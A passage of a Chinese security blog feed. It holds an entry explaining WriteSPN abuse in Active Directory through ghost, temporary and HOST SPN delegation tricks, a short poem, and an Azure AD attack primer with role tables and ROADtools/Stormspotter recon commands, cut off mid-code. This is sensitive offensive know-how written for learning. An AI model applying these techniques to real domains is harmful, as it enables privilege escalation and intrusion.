title="负载"></a>负载</h5><p>目前遇到的一个问题是存在负载的话认证的session即不能成功认证，目前还是采取最粗暴的方式，重放数据包，，打算的解决方式是通过机器名进行filter，如果负载收到不是给自己发送的数据就发送给该机器再获得返回。</p>]]></content>
    
    
    <categories>
      
      <category>AD</category>
      
    </categories>
    
    
    <tags>
      
      <tag>AD</tag>
      
      <tag>Exchange</tag>
      
      <tag>Dev</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>WriteSPN滥用</title>
    <link href="/2022/02/16/WriteSPN%E6%BB%A5%E7%94%A8/"/>
    <url>/2022/02/16/WriteSPN%E6%BB%A5%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="WriteSPN滥用"><a href="#WriteSPN滥用" class="headerlink" title="WriteSPN滥用"></a>WriteSPN滥用</h1><p>今天逛推看到的一篇大佬的研究，感觉很有意思，所以记录一下，顺便复习一下委派</p><h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>域内的信息收集工具 BloodHound 升级到版本4.1，添加了对 <code>WriteSPN</code> 的检测。众所周知，当攻击者控制了一台配置了约束委派的机器，可以攻击其锁配置的允许委派的服务账户与机器，该属性为 <code>msDS-AllowedToDelegateTo</code> （<code>SeEnableDelegation</code> 权限）该权限的更改权限默认赋予域管理员用户，但是如果攻击者拥有了对SPN关联用户的 `WriteSPN 权限，则有机会同样可以获取该机器的权限。</p><h2 id="委派回顾"><a href="#委派回顾" class="headerlink" title="委派回顾"></a>委派回顾</h2><p>具体的可以参见前文</p><h3 id="无约束委派"><a href="#无约束委派" class="headerlink" title="无约束委派"></a>无约束委派</h3><p>无约束委派直接将用户的 <code>tgt</code> 发送给服务A，A使用 <code>tgt</code> 可以A的身份访问服务B</p><h3 id="约束委派"><a href="#约束委派" class="headerlink" title="约束委派"></a>约束委派</h3><p>约束委派设置了服务A允许委派的服务，服务A获取用户的 <code>ST</code> 去访问服务B</p><p><em>约束委派允许服务凭空模拟用户，无论他们是否通过服务验证。即当拥有服务A的ntlm，可模拟任意用户访问服务B</em></p><h3 id="基于资源的约束委派"><a href="#基于资源的约束委派" class="headerlink" title="基于资源的约束委派"></a>基于资源的约束委派</h3><p>基于资源的约束委派与约束委派过程相似，方向相反。他将允许委派对象的<em>被设置权</em> 由域控授予了被委派者自己。当攻击者对该服务有可写权限，则可通过设置该机器允许被攻击者自己创建的机器委派而攻击该机器。</p><h2 id="Abuse-WriteSPN"><a href="#Abuse-WriteSPN" class="headerlink" title="Abuse WriteSPN"></a>Abuse WriteSPN</h2><h3 id="Ghost-SPN"><a href="#Ghost-SPN" class="headerlink" title="Ghost SPN"></a>Ghost SPN</h3><p>当委派机器A 被委派到一个不存在的或过期的计算机或服务的SPN时，可能是已删除或者改名。此时，该机器被设置了一个GhostSPN。</p><p>此时，攻击者可将此SPN添加到目标机器B ，当A运行完整S4U攻击时，即可获得针对该SPN的服务票证，此时该服务票证指向的是B，因为该SPN设置给了B。</p><p>然而该票据B并不能使用，因为服务与机器名与B都不匹配。但该票据是使用B的hash加密的，而前面的服务名并不在加密部分，攻击者可以更改为 <code>想要攻击的服务/B</code></p><p><img src="https://www.semperis.com/wp-content/uploads/image6.png" alt="img"></p><p><img src="https://www.semperis.com/wp-content/uploads/image7.png" alt="img"></p><h3 id="临时SPN"><a href="#临时SPN" class="headerlink" title="临时SPN"></a>临时SPN</h3><p>若 A 配置了指向 C 的SPN，而攻击者同时拥有对B、C的 <code>WriteSPN</code> 权限。则可以进行临时SPN攻击</p><p>域内并不允许非管理员用户配置冲突的SPN，即相同的SPN，因此像之前给 B 配置SPN会提示失败，因为该SPN并非失效，已经关联C。此时可将C的SPN临时删除，在配置给B，然后重复上面的攻击步骤。</p><p><img src="https://www.semperis.com/wp-content/uploads/image9.png" alt="img"></p><h3 id="HOST-SPN"><a href="#HOST-SPN" class="headerlink" title="HOST SPN"></a>HOST SPN</h3><p>这感觉是一种特性。默认情况下，计算机帐户具有与服务类 TERMSRV、RestrictedKrbHost 和 HOST 关联的 SPN。</p><p>HOST默认映射到:</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">alerter, appmgmt, cisvc, clipsrv, <span class="hljs-keyword">browser, </span>dhcp, dnscache, replicator, eventlog, eventsystem, policyagent, oakley, dmserver, dns, mcsvc, fax, msiserver, ias, messenger, netlogon, netman, netdde, netddedsm, nmagent, plugplay, protectedstorage, rasman, rpclocator, rpc, rpcss, remoteaccess, rsvp, samss, <span class="hljs-keyword">scardsvr, </span><span class="hljs-keyword">scesrv, </span>seclogon, <span class="hljs-keyword">scm, </span>dcom, cifs, spooler, snmp, <span class="hljs-keyword">schedule, </span>tapisrv, trksvr, trkwks, ups, time, wins, www, http, w3svc, iisadmin, msdtc<br></code></pre></td></tr></table></figure><p>如果攻击者试图攻击映射到 HOST 的服务类，域控将拒绝将该服务类添加到 B，即使它与 C 没有直接关联。攻击者首先必须从 C 中删除 HOST SPN，然后将目标 SPN 显式添加到 B。然而，在将目标 SPN 添加到 B 后，攻击者可以将 HOST SPN 添加回 C 而不会遇到任何验证错误，尽管已经有与 B 关联的映射 SPN</p><p><img src="https://www.semperis.com/wp-content/uploads/image10.png" alt="img"></p><p>攻击链为</p><p><img src="https://www.semperis.com/wp-content/uploads/image11-1.png" alt="img"></p>]]></content>
    
    
    <categories>
      
      <category>AD</category>
      
    </categories>
    
    
    <tags>
      
      <tag>AD</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>今天，没有星星</title>
    <link href="/2021/11/29/%E4%BB%8A%E5%A4%9C%EF%BC%8C%E6%B2%A1%E6%9C%89%E6%98%9F%E6%98%9F/"/>
    <url>/2021/11/29/%E4%BB%8A%E5%A4%9C%EF%BC%8C%E6%B2%A1%E6%9C%89%E6%98%9F%E6%98%9F/</url>
    
    <content type="html"><![CDATA[<h1 id="今天，没有星星"><a href="#今天，没有星星" class="headerlink" title="今天，没有星星"></a>今天，没有星星</h1><p>今天北京的夜空，没有星星</p><p>远处，昏黄的路灯</p><p>拙劣的模仿着，天空中的精灵</p><p>零星的车辆，流光裹挟着霓虹</p><p>溶进死寂的油彩</p><p>仍未归家的鸟哦，沙哑地吟诵着</p><p>他看见了，为北风伴舞的蓬草</p><p>他看见了，来处，那位孤独的云</p><p>向西的旅者好像带走了他的眼泪</p><p>他看不见了，还剩下什么</p><p>默默站立着的</p><p>远处，昏黄的路灯</p>]]></content>
    
    
    <categories>
      
      <category>牢骚</category>
      
    </categories>
    
    
    <tags>
      
      <tag>牢骚</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Azure AD attack</title>
    <link href="/2021/11/09/azure/"/>
    <url>/2021/11/09/azure/</url>
    
    <content type="html"><![CDATA[<h1 id="Azure-AD-attack"><a href="#Azure-AD-attack" class="headerlink" title="Azure AD attack"></a>Azure AD attack</h1><p>​                                                                        author：Gr3yy</p><p><strong><em>真常应物，真常得性，常应常静，常清静矣</em></strong></p><p>真的鸽了好久了|- _-|，一直想写点东西，正好最近项目里遇到了Azure的环境，之前也没了解过，和本地的域环境还是有些区别和相同点，所以抽时间学习一下，就一点点写叭</p><p><em>本文主要参考文章为微软官方文档以及adsecurity.org文章，以及**<a href="https://github.com/Cloud-Architekt/AzureAD-Attack-Defense">AzureAD-Attack-Defense</a>**</em></p><h2 id="什么是Azure-AD"><a href="#什么是Azure-AD" class="headerlink" title="什么是Azure AD"></a>什么是Azure AD</h2><p>开始之前当然要了解一下什么是AAD：</p><p>用微软自己的话来说：</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-variable">Azure</span> <span class="hljs-built_in">Active</span> <span class="hljs-built_in">Directory</span> <span class="hljs-punctuation">(</span><span class="hljs-variable">Azure</span> <span class="hljs-variable">AD</span><span class="hljs-punctuation">)</span> 是 <span class="hljs-variable">Microsoft</span> 基于云的身份和访问管理服务，可帮助您的员工登录并访问以下资源：<br><span class="hljs-number">1.</span>外部资源，例如 <span class="hljs-variable">Microsoft</span> <span class="hljs-number">365</span>、<span class="hljs-variable">Azure</span> 门户和数以千计的其他 <span class="hljs-variable">SaaS</span> 应用程序。<br><span class="hljs-number">2.</span>内部资源，例如您公司网络和 <span class="hljs-variable">Intranet</span> 上的应用程序，以及您自己的组织开发的任何云应用程序。有关为组织创建租户的详细信息，请参阅快速入门：在 <span class="hljs-variable">Azure</span> <span class="hljs-built_in">Active</span> <span class="hljs-built_in">Directory</span> 中创建新租户。<br></code></pre></td></tr></table></figure><p>因此：</p><ul><li>AAD是一种多租户云目录和<a href="https://docs.microsoft.com/en-us/azure/active-directory/develop/authentication-scenarios">身份验证</a>服务</li><li>使用office365用于传统域内的帐户、组和角色</li><li>提供身份验证的同时也是身份提供者</li></ul><h3 id="Azure-AD-与传统AD的区别"><a href="#Azure-AD-与传统AD的区别" class="headerlink" title="Azure AD 与传统AD的区别"></a>Azure AD 与传统AD的区别</h3><p>不要被AAD的名字误导，AAD不是简单的布在云上AD环境，我们还是先用微软的一句话来描述</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-variable">Azure</span> <span class="hljs-built_in">Active</span> <span class="hljs-built_in">Directory</span> 是云标识和访问管理解决方案的下一个演变。<span class="hljs-variable">Microsoft</span> 在 <span class="hljs-variable">Windows</span> <span class="hljs-number">2000</span> 中引入了 <span class="hljs-built_in">Active</span> <span class="hljs-built_in">Directory</span> 域服务，使组织能够使用每个用户的单一身份来管理多个本地基础结构组件和系统。<br></code></pre></td></tr></table></figure><p>OK ，那么下面来看看他们之间的区别，当然以下概念也只是简单的描述，各个概念的具体描述请参考官方文档。</p><table><thead><tr><th align="center"></th><th align="center">AD</th><th align="center">Azure AD</th></tr></thead><tbody><tr><td align="center">创建用户</td><td align="center">企业管理者手动创建或者使用自动配置系统和hr系统联动</td><td align="center">现有 AD 组织使用<a href="https://docs.microsoft.com/en-us/azure/active-directory/hybrid/how-to-connect-sync-whatis">Azure AD Connect</a>将身份同步到云。可与云HR系统联动</td></tr><tr><td align="center">权限管理 与 组</td><td align="center">域管理者将用户分配进不同的组，应用与服务根据组可分配不同权限</td><td align="center">AAD也提供组，管理员也可通过组来授予不同权限。管理员可通过查询将用户动态包含进组。Azure可以使用 <a href="https://docs.microsoft.com/en-us/azure/active-directory/governance/entitlement-management-overview">Entitlement management</a> 机制，通过访问包来管理用户权限</td></tr><tr><td align="center">域管理</td><td align="center">企业通过域、组织和组的组合，委派管理权限来管理它控制的目录和资源。</td><td align="center">Azure AD使用Privileged Identity Management (PIM)来进基于角色的管理权限委派</td></tr><tr><td align="center">凭证管理</td><td align="center">Active Directory 中的凭据基于密码、证书身份验证和智能卡身份验证。使用基于密码长度、到期时间和复杂性的密码策略来管理密码。</td><td align="center">Azure提供智能密码保护以及多因素身份认证</td></tr><tr><td align="center">认证</td><td align="center">大多数本地应用程序使用 LDAP、Windows 集成身份验证（NTLM 和 Kerberos）或基于标头的身份验证来控制对用户的访问。</td><td align="center">Azure AD 可以使用在本地运行的<a href="https://docs.microsoft.com/en-us/azure/active-directory/app-proxy/application-proxy">Azure AD 应用程序代理</a>提供对这些类型的本地应用程序的访问。使用此方法 Azure AD 可以在迁移或需要与旧应用共存时使用 Kerberos 对本地 Active Directory 用户进行身份验证。</td></tr><tr><td align="center">SaaS与外部应用</td><td align="center">本地AD不支持saas,可通过联合ADFS</td><td align="center">作为oauth2身份认证方式与Saas联动</td></tr><tr><td align="center">服务</td><td align="center">在AD中运行的服务通常使用 AD 服务帐户或组托管服务帐户 (gMSA) 来运行。这些应用将继承服务帐户的权限</td><td align="center">Azure AD 提供<a href="https://docs.microsoft.com/en-us/azure/active-directory/managed-identities-azure-resources/">托管标识</a>以在云中运行其他工作负载。这些身份的生命周期由 Azure AD 管理并与资源提供者绑定，不能用于其他目的以获取后门访问权限。</td></tr><tr><td align="center">移动设备</td><td align="center">Active Directory 本身不支持没有第三方解决方案的移动设备</td><td align="center">Microsoft 的移动设备管理解决方案 Microsoft Intune 与 Azure AD 集成。Microsoft Intune 向身份系统提供设备状态信息以在身份验证期间进行评估。</td></tr><tr><td align="center">windows desktop</td><td align="center">可入域，通过域策略管理</td><td align="center">Windows 设备可以加入 Azure AD。条件访问可以检查设备是否已加入 Azure AD。Windows 设备也可以使用<a href="https://docs.microsoft.com/en-us/intune/what-is-intune">Microsoft Intune</a>进行管理。在这种情况下，条件访问将在允许访问应用程序之前考虑设备是否合规（例如，最新的安全补丁和病毒签名）。</td></tr></tbody></table><p><img src="https://adsecurity.org/wp-content/uploads/2020/01/image-1024x556.png" alt="img"></p><h3 id="GUID-与-SID"><a href="#GUID-与-SID" class="headerlink" title="GUID 与 SID"></a>GUID 与 SID</h3><p>不同于AD使用sid唯一标识用户，Azure AD使用自己独有的GUID表示用户</p><p>通过将 “S-1-12-1-” 与 GUID 的简单拆分处理后进行组合是可以将用户的GUID 转换成 SID 的：</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs armasm">[base16(<span class="hljs-built_in">a1</span>)]-[base16(<span class="hljs-built_in">a2</span>)]-[ base16(<span class="hljs-built_in">a3</span>)]-[base16(<span class="hljs-built_in">a4</span>)]<br>S-<span class="hljs-number">1</span>–<span class="hljs-number">12</span>–<span class="hljs-number">1</span>-[base10(<span class="hljs-built_in">a1</span>)]-[ base10(<span class="hljs-built_in">a2</span>)]-[ base10(<span class="hljs-built_in">a3</span>)]-[ base10(<span class="hljs-built_in">a4</span>)]<br></code></pre></td></tr></table></figure><p>例如：当GUID 为 <code>6aa89ecb-1f8f-4d92–810d-b0dce30b6c82</code> 时，转换后为 <code>S-1–12–1–1789435595–1301421967–3702525313–2188119011</code></p><h3 id="管理Azure-AD"><a href="#管理Azure-AD" class="headerlink" title="管理Azure AD"></a>管理Azure AD</h3><ul><li><p>不同于传统AD的管理工具，Azure AD主要使用 <a href="https://portal.azure.com/">https://portal.azure.com</a> 控制台管理Azure AD</p><p><img src="https://adsecurity.org/wp-content/uploads/2020/01/image-8-1024x928.png" alt="img"></p></li><li><p>还可以与本地一样通过 powershell 管理AAD。</p></li></ul><p>由于 Azure AD 没有 LDAP，因此与 涉及AAD 的接口一般通过 Graph API（或 PowerShell 模块）进行连接。</p><p>有 2 个主要的 PowerShell 模块用于与 Azure AD 交互：MSOnline和AzureAD，安装命令如下</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Install-Module</span> <span class="hljs-literal">-Name</span> MSOnline <span class="hljs-literal">-Force</span><br><span class="hljs-built_in">Install-Module</span> <span class="hljs-literal">-Name</span> AzureAD <span class="hljs-literal">-Force</span><br></code></pre></td></tr></table></figure><p><img src="/img/article2/image-20211109030143664.png" alt="image-20211109030143664"></p><p>使用文档：<a href="https://docs.microsoft.com/en-us/powershell/module/azuread/get-azureaddomain?view=azureadps-2.0">https://docs.microsoft.com/en-us/powershell/module/azuread/get-azureaddomain?view=azureadps-2.0</a></p><p>具体的cmdlet研究我们之后再写</p><h3 id="角色与权限"><a href="#角色与权限" class="headerlink" title="角色与权限"></a>角色与权限</h3><p><em><a href="https://docs.microsoft.com/en-us/azure/active-directory/roles/permissions-reference">https://docs.microsoft.com/en-us/azure/active-directory/roles/permissions-reference</a></em></p><p>Azure AD 用户可以查看有关用户和组的信息，但对可访问的内容有一些限制。在Azure AD中特权用户称为 “ Role “，可以将它理解为一个特权组，为o365应用提供特定管理权限。</p><p>以下是官方文档</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mathematica">在 <span class="hljs-variable">Azure</span> <span class="hljs-built_in">Active</span> <span class="hljs-built_in">Directory</span> <span class="hljs-punctuation">(</span><span class="hljs-variable">Azure</span> <span class="hljs-variable">AD</span><span class="hljs-punctuation">)</span> 中，如果其他管理员或非管理员需要管理 <span class="hljs-variable">Azure</span> <span class="hljs-variable">AD</span> 资源，您可以为他们分配一个 <span class="hljs-variable">Azure</span> <span class="hljs-variable">AD</span> 角色来提供他们所需的权限。例如，您可以分配角色以允许添加或更改用户、重置用户密码、管理用户许可证或管理域名。<br></code></pre></td></tr></table></figure><p>角色很多，这里简单列几个：</p><h4 id="认证管理员（Authentication-Administrator）"><a href="#认证管理员（Authentication-Administrator）" class="headerlink" title="认证管理员（Authentication Administrator）"></a>认证管理员（Authentication Administrator）</h4><p>顾名思义，负责管理用户认证的角色组。具有此角色的用户可以为非验证管理员和某些角色设置或重置任何身份验证方法（包括密码）。身份验证管理员也可以要求非验证管理员和某些角色根据现有的非密码凭据（例如 MFA 或 FIDO）重新注册。以下为可读取或修改认证的角色权限列表</p><table><thead><tr><th align="left">Password can be reset</th><th align="left">Password Admin</th><th align="left">Helpdesk Admin</th><th align="left">Authentication Admin</th><th align="left">User Admin</th><th align="left">Privileged Authentication Admin</th><th align="left">Global Admin</th></tr></thead><tbody><tr><td align="left">Authentication Admin</td><td align="left"></td><td align="left"></td><td align="left">✔️</td><td align="left"></td><td align="left">✔️</td><td align="left">✔️</td></tr><tr><td align="left">Directory Readers</td><td align="left">✔️</td><td align="left">✔️</td><td align="left">✔️</td><td align="left">✔️</td><td align="left">✔️</td><td align="left">✔️</td></tr><tr><td align="left">Global Admin</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left">✔️</td><td align="left">✔️*</td></tr><tr><td align="left">Groups Admin</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left">✔️</td><td align="left">✔️</td><td align="left">✔️</td></tr><tr><td align="left">Guest Inviter</td><td align="left">✔️</td><td align="left">✔️</td><td align="left">✔️</td><td align="left">✔️</td><td align="left">✔️</td><td align="left">✔️</td></tr><tr><td align="left">Helpdesk Admin</td><td align="left"></td><td align="left">✔️</td><td align="left"></td><td align="left">✔️</td><td align="left">✔️</td><td align="left">✔️</td></tr><tr><td align="left">Message Center Reader</td><td align="left"></td><td align="left">✔️</td><td align="left">✔️</td><td align="left">✔️</td><td align="left">✔️</td><td align="left">✔️</td></tr><tr><td align="left">Password Admin</td><td align="left">✔️</td><td align="left">✔️</td><td align="left">✔️</td><td align="left">✔️</td><td align="left">✔️</td><td align="left">✔️</td></tr><tr><td align="left">Privileged Authentication Admin</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left">✔️</td><td align="left">✔️</td></tr><tr><td align="left">Privileged Role Admin</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left">✔️</td><td align="left">✔️</td></tr><tr><td align="left">Reports Reader</td><td align="left"></td><td align="left">✔️</td><td align="left">✔️</td><td align="left">✔️</td><td align="left">✔️</td><td align="left">✔️</td></tr><tr><td align="left">User (no admin role)</td><td align="left">✔️</td><td align="left">✔️</td><td align="left">✔️</td><td align="left">✔️</td><td align="left">✔️</td><td align="left">✔️</td></tr><tr><td align="left">User (no admin role, but member of a role-assignable group)</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left">✔️</td><td align="left">✔️</td></tr><tr><td align="left">User Admin</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left">✔️</td><td align="left">✔️</td><td align="left">✔️</td></tr><tr><td align="left">Usage Summary Reports Reader</td><td align="left"></td><td align="left">✔️</td><td align="left">✔️</td><td align="left">✔️</td><td align="left">✔️</td><td align="left">✔️</td></tr></tbody></table><p>具有此角色的用户可以更改部分有权访问 Azure AD 内部和外部的敏感信息或关键配置的用户的凭据。更改用户的凭据可能意味着能够获取该用户的身份和权限。例如：</p><ul><li>应用程序注册和企业应用程序所有者，他们可以管理他们拥有的应用程序的凭据。这些应用程序可能在 Azure AD 和其他地方拥有身份认证管理员不拥有的特权。通过此方法，身份验证管理员可以获取应用程序所有者的身份，然后通过更新应用程序的凭据进一步滥用特权应用程序的身份。</li><li>Azure 订阅所有者，他们可能有权访问 Azure 中的敏感或私有信息或关键配置。</li><li>可以管理组成员身份的安全组和 Microsoft 365 组所有者。这些组可能会授予对 Azure AD 和其他地方的敏感或私有信息或关键配置的访问权限。</li><li>Azure AD 之外的其他服务（例如 Exchange Online、Office 安全与合规中心以及人力资源系统）中的管理员。</li><li>非管理员，例如可能有权访问敏感或私人信息的高管、法律顾问和人力资源员工。</li></ul><p>关于身份认证的管理员有：认证管理员、<a href="https://docs.microsoft.com/en-us/azure/active-directory/roles/permissions-reference#privileged-authentication-administrator">特权验证管理员</a>、<a href="https://docs.microsoft.com/en-us/azure/active-directory/roles/permissions-reference#authentication-policy-administrator">验证策略管理员</a></p><table><thead><tr><th align="left">角色</th><th align="left">管理用户的身份验证方法</th><th align="left">管理用户 MFA</th><th align="left">管理 MFA 设置</th><th align="left">管理身份验证方法策略</th><th align="left">管理密码保护策略</th></tr></thead><tbody><tr><td align="left">认证管理员</td><td align="left">对某些用户是（见上表）</td><td align="left">对某些用户是（见上表）</td><td align="left">否</td><td align="left">否</td><td align="left">否</td></tr><tr><td align="left">特权认证管理员</td><td align="left">适用于所有用户</td><td align="left">适用于所有用户</td><td align="left">否</td><td align="left">否</td><td align="left">否</td></tr><tr><td align="left">身份验证策略管理员</td><td align="left">否</td><td align="left">否</td><td align="left">是的</td><td align="left">是的</td><td align="left">是的</td></tr></tbody></table><h4 id="Exchange-管理员（Exchange-Administrator）"><a href="#Exchange-管理员（Exchange-Administrator）" class="headerlink" title="Exchange 管理员（Exchange Administrator）"></a>Exchange 管理员（Exchange Administrator）</h4><p>具有此角色的用户在 Microsoft Exchange Online 中具有全局权限。还能够创建和管理所有 Microsoft 365 组、管理票据和监控服务运行状况。</p><table><thead><tr><th align="center">Action</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">microsoft.directory/groups/hiddenMembers/read</td><td align="center">读取安全组和 Microsoft 365 组的隐藏成员，包括可分配角色的组</td></tr><tr><td align="center">microsoft.directory/groups.unified/create</td><td align="center">创建 Microsoft 365 组，不包括可分配角色的组</td></tr><tr><td align="center">microsoft.directory/groups.unified/delete</td><td align="center">删除 Microsoft 365 组，不包括可分配角色的组</td></tr><tr><td align="center">microsoft.directory/groups.unified/restore</td><td align="center">还原 Microsoft 365 组</td></tr><tr><td align="center">microsoft.directory/groups.unified/basic/update</td><td align="center">更新 Microsoft 365 组的基本属性，不包括可分配角色的组</td></tr><tr><td align="center">microsoft.directory/groups.unified/members/update</td><td align="center">更新 Microsoft 365 组的成员，不包括可分配角色的组</td></tr><tr><td align="center">microsoft.directory/groups.unified/owners/update</td><td align="center">更新 Microsoft 365 组的所有者，不包括可分配角色的组</td></tr><tr><td align="center">microsoft.azure.serviceHealth/allEntities/allTasks</td><td align="center">读取和配置 Azure 服务运行状况</td></tr><tr><td align="center">microsoft.azure.supportTickets/allEntities/allTasks</td><td align="center">创建和管理 Azure 支持票据</td></tr><tr><td align="center">microsoft.office365.exchange/allEntities/basic/allTasks</td><td align="center">管理 Exchange Online 的所有方面</td></tr><tr><td align="center">microsoft.office365.network/performance/allProperties/read</td><td align="center">在 Microsoft 365 管理中心阅读所有网络性能属性</td></tr><tr><td align="center">microsoft.office365.serviceHealth/allEntities/allTasks</td><td align="center">在 Microsoft 365 管理中心阅读和配置服务运行状况</td></tr><tr><td align="center">microsoft.office365.supportTickets/allEntities/allTasks</td><td align="center">创建和管理 Microsoft 365 服务请求</td></tr><tr><td align="center">microsoft.office365.usageReports/allEntities/allProperties/read</td><td align="center">阅读 Office 365 使用情况报告</td></tr><tr><td align="center">microsoft.office365.webPortal/allEntities/standard/read</td><td align="center">在 Microsoft 365 管理中心阅读所有资源的基本属性</td></tr></tbody></table><h4 id="Exchange-收件人管理员（Exchange-Recipient-Administrator）"><a href="#Exchange-收件人管理员（Exchange-Recipient-Administrator）" class="headerlink" title="Exchange 收件人管理员（Exchange Recipient Administrator）"></a>Exchange 收件人管理员（Exchange Recipient Administrator）</h4><p>具有此角色的用户对 Exchange Online 中的收件人具有读取访问权限和属性写入的权限。</p><table><thead><tr><th align="center">Action</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">microsoft.office365.exchange/allRecipients/allProperties/allTasks</td><td align="center">在 Exchange Online 中创建和删除所有收件人，以及读取和更新收件人的所有属性</td></tr><tr><td align="center">microsoft.office365.exchange/messageTracking/allProperties/allTasks</td><td align="center">在 Exchange Online 中管理邮件跟踪中的所有任务</td></tr><tr><td align="center">microsoft.office365.exchange/migration/allProperties/allTasks</td><td align="center">管理与 Exchange Online 中的收件人迁移相关的所有任务</td></tr></tbody></table><h4 id="全局管理员（Global-Administrator）"><a href="#全局管理员（Global-Administrator）" class="headerlink" title="全局管理员（Global Administrator）"></a>全局管理员（Global Administrator）</h4><p>具有此角色的用户可以访问 Azure AD 中的所有管理功能，以及使用 Azure AD 标识的服务，例如 Microsoft 365 安全中心、Microsoft 365 合规中心、Exchange Online、SharePoint Online 和 Skype for Business Online。此外，全局管理员可以<a href="https://docs.microsoft.com/en-us/azure/role-based-access-control/elevate-access-global-admin">提升其管理所有 Azure 订阅和管理组的权限</a>。这允许全局管理员使用相应的 Azure AD 租户获得对所有 Azure 资源的完全访问权限。注册 Azure AD 的用户将成为全局管理员。全局管理员可以为任何用户和所有其他管理员重置密码。（默认不超过五个）</p><p>可以理解为包含了传统AD的 Enterprise Admins、Domain Admins、Administrators组</p><h4 id="特权身份管理（PIM）"><a href="#特权身份管理（PIM）" class="headerlink" title="特权身份管理（PIM）"></a>特权身份管理（PIM）</h4><p>PIM是Azure AD中的一项服务，可用于管理、控制和监视对组织中重要资源的访问。这些资源包括 Azure AD、Azure 和其他 Microsoft 在线服务（例如 Microsoft 365 或 Microsoft Intune）中的资源。当管理员需要管理员权限时，他们可以通过 PIM（可以发送以供批准或自动批准）请求和获得访问权限。Microsoft 建议角色中的所有帐户都由 PIM 管理。</p><p>安装用于PIM的powershell模块</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Install-Module</span> <span class="hljs-literal">-Name</span> Microsoft.Azure.ActiveDirectory.PIM.PSModule<br></code></pre></td></tr></table></figure><h2 id="攻击Azure-AD"><a href="#攻击Azure-AD" class="headerlink" title="攻击Azure AD"></a>攻击Azure AD</h2><p>OK，介绍告一段落，下面我们可以开始正式的攻击探讨啦。</p><h3 id="信息侦察"><a href="#信息侦察" class="headerlink" title="信息侦察"></a>信息侦察</h3><p><strong><em>微软的门户列表</em></strong> ：<a href="https://msportals.io/">https://msportals.io/</a></p><p><img src="http://47.75.197.183/ss/azure.png" alt="image-20211108082557627"></p><p>无论是打点还是内网渗透，信息收集永远都是最重要的一步。好的信息收集就是一次渗透成功的一半。</p><h4 id="工具-框架"><a href="#工具-框架" class="headerlink" title="工具 \ 框架"></a>工具 \ 框架</h4><p><a href="https://github.com/dirkjanm/ROADtools">dirkjanm/<em>ROADtools</em></a></p><p><img src="https://github.com/dirkjanm/ROADtools/raw/master/roadrecon/frontend/src/assets/rt_transparent.svg" alt="ROADtools logo"></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs powershell">pipenv shell<br>roadrecon auth [-<span class="hljs-type">h</span>] [-<span class="hljs-type">u</span> <span class="hljs-type">USERNAME</span>] [-<span class="hljs-type">p</span> <span class="hljs-type">PASSWORD</span>] [-<span class="hljs-type">t</span> <span class="hljs-type">TENANT</span>] [-<span class="hljs-type">c</span> <span class="hljs-type">CLIENT</span>] [--<span class="hljs-type">as</span>-<span class="hljs-type">app</span>] [--<span class="hljs-type">device</span>-<span class="hljs-type">code</span>] [--<span class="hljs-type">access</span>-<span class="hljs-type">token</span> <span class="hljs-type">ACCESS_TOKEN</span>] [--<span class="hljs-type">refresh</span>-<span class="hljs-type">token</span> <span class="hljs-type">REFRESH_TOKEN</span>] [-<span class="hljs-type">f</span> <span class="hljs-type">TOKENFILE</span>] [--<span class="hljs-type">tokens</span>-<span class="hljs-type">stdout</span>]<br>roadrecon gather [-<span class="hljs-type">h</span>] [-<span class="hljs-type">d</span> <span class="hljs-type">DATABASE</span>] [-<span class="hljs-type">f</span> <span class="hljs-type">TOKENFILE</span>] [--<span class="hljs-type">tokens</span>-<span class="hljs-type">stdin</span>] [--<span class="hljs-type">mfa</span>]<br>roadrecon auth <span class="hljs-literal">-u</span> test<span class="hljs-selector-tag">@</span>&lt;TENANT NAME&gt;.onmicrosoft.com <span class="hljs-literal">-p</span> &lt;PASSWORD&gt;<br>roadrecon gather<br>roadrecon gui<br></code></pre></td></tr></table></figure><p><a href="https://github.com/Azure/Stormspotter">Azure/<em>Stormspotter</em></a></p><p>有点像bloodhund的资产以及攻击路径绘制工具。</p><p><img src="https://github.com/Azure/Stormspotter/raw/main/docs/stormspotter.png" alt="img"></p><p>安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/Azure/Stormspotter<br>docker-compose up<br></code></pre></td></tr></table></figure><p>使用</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code 